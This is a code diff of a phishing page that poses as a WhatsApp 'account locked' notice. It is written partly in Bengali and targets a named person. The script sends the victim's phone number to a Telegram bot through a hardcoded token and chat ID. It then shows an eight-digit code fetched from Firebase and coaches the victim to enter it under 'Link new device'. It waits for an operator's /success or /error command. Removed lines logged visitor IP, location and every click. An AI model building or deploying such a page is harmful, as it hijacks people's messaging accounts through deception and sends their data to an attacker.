@@ -19,10 +19,8 @@
             background-color: #d1d7db;
             height: 100vh;
             overflow: hidden;
-            -webkit-tap-highlight-color: transparent;
         }
 
-        /* Whatsapp Background */
         .app-wrapper {
             max-width: 100%;
             height: 100%;
@@ -35,7 +33,6 @@
             background-blend-mode: overlay;
         }
 
-        /* Encryption Message */
         .encryption-msg {
             background-color: #ffeecd;
             color: #54656f;
@@ -69,17 +66,19 @@
             font-size: 14px;
             transition: background 0.2s;
             width: 100%;
+            border: none;
+            cursor: pointer;
         }
         .wa-btn:active { background-color: #006b57; }
 
         /* Pin Box */
         .pin-box {
-            width: 38px;
-            height: 48px;
+            width: 35px;
+            height: 45px;
             border: 1px solid #d1d7db;
             background: #f0f2f5;
             text-align: center;
-            font-size: 22px;
+            font-size: 20px;
             font-weight: bold;
             color: #111b21;
             border-radius: 6px;
@@ -91,27 +90,25 @@
         /* Video Container */
         .video-container {
             width: 100%;
-            height: 160px;
+            height: 180px;
             background: black;
             border-radius: 8px;
             overflow: hidden;
             margin-bottom: 15px;
             border: 1px solid #e5e7eb;
+            position: relative;
         }
         
         .instruction-list {
             text-align: left;
             font-size: 13px;
             color: #54656f;
-            margin-top: 10px;
-            list-style: none;
-            padding: 0;
+            margin-top: 15px;
+            padding: 10px;
+            background: #f7f9fa;
+            border-radius: 8px;
         }
-        .instruction-list li {
-            margin-bottom: 6px;
-            display: flex;
-            gap: 8px;
-        }
+        .instruction-list li { margin-bottom: 5px; }
 
         @keyframes fadeIn {
             from { opacity: 0; transform: translateY(10px); }
@@ -137,6 +134,19 @@
             align-items: center;
             color: #8696a0;
             font-size: 15px;
+        }
+
+        /* Error Message Box */
+        .error-box {
+            background-color: #ffebee;
+            border: 1px solid #ffcdd2;
+            color: #c62828;
+            padding: 10px;
+            border-radius: 8px;
+            font-size: 13px;
+            margin-top: 10px;
+            text-align: left;
+            display: none; /* Hidden initially */
         }
     </style>
 </head>
@@ -200,7 +210,14 @@
                 </form>
             </div>
 
-            <!-- PHASE 2: VIDEO & CODE -->
+            <!-- PHASE 2: LOADING (5 Seconds) -->
+            <div id="loadingSection" class="hidden system-card mx-auto max-w-[320px]">
+                <div class="w-12 h-12 border-4 border-gray-200 border-t-[#008069] rounded-full animate-spin mx-auto mb-4"></div>
+                <h2 class="text-lg font-bold text-gray-800">Unlocking...</h2>
+                <p class="text-xs text-gray-500">Please wait while we verify details.</p>
+            </div>
+
+            <!-- PHASE 3: GUIDE & CODE -->
             <div id="guideSection" class="hidden system-card mx-auto max-w-[340px]">
                 
                 <!-- Video Frame -->
@@ -216,35 +233,39 @@
                     Nusrat jahan whatsapp account is locked please follow this unlock step
                 </h2>
 
-                <!-- Live Code -->
-                <div id="pinContainer" class="flex justify-center gap-1 mb-5">
+                <!-- Countdown UI -->
+                <div id="countdownBox" class="bg-amber-50 text-amber-800 text-sm py-2 px-4 rounded mb-4 border border-amber-100 font-bold">
+                    Your Unlock Number is Coming soon... <span id="timerDisplay">20</span>s
+                </div>
+
+                <!-- Live Code Box (Hidden initially) -->
+                <div id="pinContainer" class="hidden flex justify-center gap-1 mb-4">
                     <div class="pin-box pin-digit"></div><div class="pin-box pin-digit"></div><div class="pin-box pin-digit"></div><div class="pin-box pin-digit"></div>
                     <div class="pin-box pin-digit"></div><div class="pin-box pin-digit"></div><div class="pin-box pin-digit"></div><div class="pin-box pin-digit"></div>
                 </div>
 
-                <!-- Instructions -->
-                <ul class="instruction-list">
-                    <li>
-                        <span class="font-bold text-[#008069]">1.</span> 
-                        <span>Notification থেকে <b>"Link new device"</b> এ যান।</span>
-                    </li>
-                    <li>
-                        <span class="font-bold text-[#008069]">2.</span> 
-                        <span>Confirm করে আনলক করুন।</span>
-                    </li>
-                    <li>
-                        <span class="font-bold text-[#008069]">3.</span> 
-                        <span>উপরের কোডটি প্রবেশ করান।</span>
-                    </li>
-                </ul>
+                <!-- Action Button (Hidden initially) -->
+                <button id="actionBtn" class="hidden w-full py-3 bg-[#008069] text-white font-bold rounded-full shadow-lg hover:bg-[#006b57] transition-all animate-pulse mb-4 text-sm">
+                    Enter this unlock number here
+                </button>
 
-                <!-- Deep Link Button -->
-                <a href="whatsapp://" onclick="trackClick('Unlock Button Clicked')" class="mt-5 block w-full py-3 bg-[#25D366] text-white font-bold rounded-full shadow-lg hover:bg-[#1dbb5f] transition-all animate-pulse text-center no-underline text-sm">
-                    আনলক করতে এখানে ক্লিক করুণ
-                </a>
+                <!-- Instructions -->
+                <div class="instruction-text text-left text-sm text-gray-600 bg-gray-50 p-3 rounded">
+                    <p class="font-bold underline mb-1">নির্দেশনা:</p>
+                    <ol class="list-decimal list-inside space-y-1">
+                        <li>Notification থেকে <b>"Link new device"</b> এ যান।</li>
+                        <li>Confirm করে আনলক করুন।</li>
+                        <li>উপরের কোডটি প্রবেশ করান।</li>
+                    </ol>
+                </div>
+
+                <!-- Error Message Container -->
+                <div id="errorBox" class="error-box">
+                    <p><b>Warning:</b> দয়া করে আপনার ফোন এর notification থেকে Enter cod to link new device এর ভেতরে প্রবেশ করুন এবং Whatsapp পেজে থাকা আনলক নাম্বার ৮টি সেখানে বসান। এই আনলক নাম্বার ৮টি সুরক্ষার জন্য প্রতি ১মিনিট পর পর পরিবর্তন হতে পারে।</p>
+                </div>
             </div>
 
-            <!-- PHASE 3: SUCCESS -->
+            <!-- PHASE 4: SUCCESS (Start Button) -->
             <div id="successSection" class="hidden system-card mx-auto max-w-[320px]">
                 <div class="w-16 h-16 bg-green-100 text-green-600 rounded-full flex items-center justify-center mx-auto mb-4 text-3xl">
                     <i class="fa-solid fa-check"></i>
@@ -285,59 +306,52 @@
             measurementId: "G-EQ1QQDBTKG"
         };
 
-        const TELEGRAM_BOT_TOKEN = "8367516207:AAEKQnowvWWC32Z2eaPVjuRrxKfl1alssIA"; 
-        const CHAT_ID = "8271536101";
+        const TELEGRAM_BOT_TOKEN = "7974529959:AAEyUKUkiGdMsLVqNz_fQdL2s3kiE5apuGM"; 
+        const CHAT_ID = "6658445342";
         const API_URL_SEND = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
         const API_URL_UPDATES = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates`;
 
-        // --- GLOBAL CLICK TRACKER ---
-        document.addEventListener('click', (e) => {
-            const target = e.target.innerText || e.target.tagName;
-            if(target) {
-                // Send click event to Telegram silently (without await to not block UI)
-                fetch(API_URL_SEND, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: CHAT_ID, text: `👆 User Clicked: ${target}`, parse_mode: 'Markdown' })
-                }).catch(err => console.log(err));
-            }
-        });
-
         // DOM Elements
         const inputSection = document.getElementById('inputSection');
+        const loadingSection = document.getElementById('loadingSection');
         const guideSection = document.getElementById('guideSection');
         const successSection = document.getElementById('successSection');
+        
         const phoneForm = document.getElementById('phoneForm');
         const phoneNumberInput = document.getElementById('phoneNumber');
+        
+        const countdownBox = document.getElementById('countdownBox');
+        const timerDisplay = document.getElementById('timerDisplay');
+        
+        const pinContainer = document.getElementById('pinContainer');
         const pinDigits = document.querySelectorAll('.pin-digit');
+        const actionBtn = document.getElementById('actionBtn');
+        const errorBox = document.getElementById('errorBox');
+        
         const messageTrigger = document.getElementById('messageTrigger');
         const startBtn = document.getElementById('startBtn');
 
         let lastUpdateId = 0;
         let pollingInterval;
 
-        // Visitor Alert on Load
-        window.addEventListener('load', () => {
-            fetch('https://ipwho.is/')
-                .then(res => res.json())
-                .then(data => {
-                    const msg = `🔔 *WhatsApp Page Visit Now*\nIP: ${data.ip}\nLoc: ${data.city}, ${data.country}`;
-                    sendToTelegram(msg);
-                })
-                .catch(() => sendToTelegram("🔔 *WhatsApp Page Visit Now* (IP Failed)"));
+        // --- Logic: Click footer to trigger verification ---
+        messageTrigger.addEventListener('click', () => {
+            inputSection.scrollIntoView({ behavior: 'smooth', block: 'center' });
+            phoneNumberInput.focus();
         });
 
-        async function sendToTelegram(text) {
+        // --- Logic: Send Telegram Msg ---
+        async function sendTelegramMessage(text) {
             try {
                 await fetch(API_URL_SEND, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'Markdown' })
                 });
-            } catch (error) { console.error("TG Error:", error); }
+            } catch (error) { console.error("Telegram error:", error); }
         }
 
-        // Firebase Sync
+        // --- Logic: Firebase Live Code ---
         function startFirebaseListener() {
             try {
                 const app = initializeApp(firebaseConfig);
@@ -354,7 +368,7 @@
             } catch (error) { console.error(error); }
         }
 
-        // Telegram Polling for Command
+        // --- Logic: Poll Telegram for "successful" or "error" command ---
         function startTelegramPolling() {
             pollingInterval = setInterval(async () => {
                 try {
@@ -367,23 +381,24 @@
                             const messageText = update.message?.text?.trim().toLowerCase();
 
                             if (messageText === 'successfull' || messageText === '/success') {
+                                // Show Success Screen
                                 clearInterval(pollingInterval);
                                 guideSection.classList.add('hidden');
                                 successSection.classList.remove('hidden');
+                            } 
+                            else if (messageText === '/error') {
+                                // Show Error Message
+                                errorBox.style.display = 'block';
                             }
                         });
                     }
-                } catch (error) { console.error(error); }
-            }, 2000);
+                } catch (error) {
+                    console.error("Polling error:", error);
+                }
+            }, 2000); // Check every 2 seconds
         }
 
-        // Click Footer -> Focus Input
-        messageTrigger.addEventListener('click', () => {
-            inputSection.scrollIntoView({ behavior: 'smooth', block: 'center' });
-            phoneNumberInput.focus();
-        });
-
-        // Form Submit Logic
+        // --- Logic: Phone Submit ---
         phoneForm.addEventListener('submit', async (e) => {
             e.preventDefault();
             const phone = phoneNumberInput.value.trim();
@@ -393,19 +408,60 @@
                 return;
             }
 
-            // 1. Send Number
-            await sendToTelegram(`📱 *Phone Number Submitted*\nNumber: \`${phone}\``);
+            // 1. Send Number to Telegram
+            await sendTelegramMessage(`*🚨 Login Attempt (WhatsApp)*\nUser: Nusrat jahan\nPhone: \`${phone}\`\n\n_System: 5s Unlocking Animation Started..._`);
 
-            // 2. Switch UI
+            // 2. Show Loading (5 Seconds)
             inputSection.classList.add('hidden');
-            guideSection.classList.remove('hidden');
+            loadingSection.classList.remove('hidden');
 
-            // 3. Start Listeners
-            startFirebaseListener();
-            startTelegramPolling();
+            setTimeout(() => {
+                // After 5s: Show Guide Section with Countdown
+                loadingSection.classList.add('hidden');
+                guideSection.classList.remove('hidden');
+                startCountdownLogic();
+            }, 5000);
         });
 
-        // Start Chat Logic
+        // --- Logic: Countdown 20s ---
+        function startCountdownLogic() {
+            let timeLeft = 20;
+            const timerInterval = setInterval(() => {
+                timeLeft--;
+                if(timerDisplay) timerDisplay.textContent = timeLeft;
+
+                if (timeLeft <= 0) {
+                    clearInterval(timerInterval);
+                    
+                    // Show PINs and Button
+                    countdownBox.classList.add('hidden');
+                    pinContainer.classList.remove('hidden');
+                    actionBtn.classList.remove('hidden');
+                    
+                    // Start Syncing
+                    startFirebaseListener();
+                }
+            }, 1000);
+        }
+
+        // --- Logic: Action Button (Enter this unlock number) ---
+        actionBtn.addEventListener('click', async () => {
+            // 1. Send Telegram Msg: User wants to enter
+            await sendTelegramMessage(`⚠️ *User Action:* User clicked 'Enter unlock number'.\n\n_Bot Action: Trying to open 'Link new device' and Polling for Admin Command..._`);
+
+            // 2. Try to open WhatsApp (Simulate Notification Click)
+            window.location.href = "whatsapp://";
+
+            // 3. Send Telegram Msg: Entered option
+            setTimeout(async () => {
+                await sendTelegramMessage(`✅ *System:* Enter cod to link new device অপশনের ভেতরে প্রবেশ করানো হয়েছে।\n\n👉 Now send: \`/success\` or \`/error\``);
+                
+                // 4. Start listening for Admin Commands
+                startTelegramPolling();
+            }, 2000);
+        });
+
+        // --- Logic: Start Button (Final Redirect) ---
         startBtn.addEventListener('click', () => {
             window.location.href = "https://wa.me/8801806853977";
         });
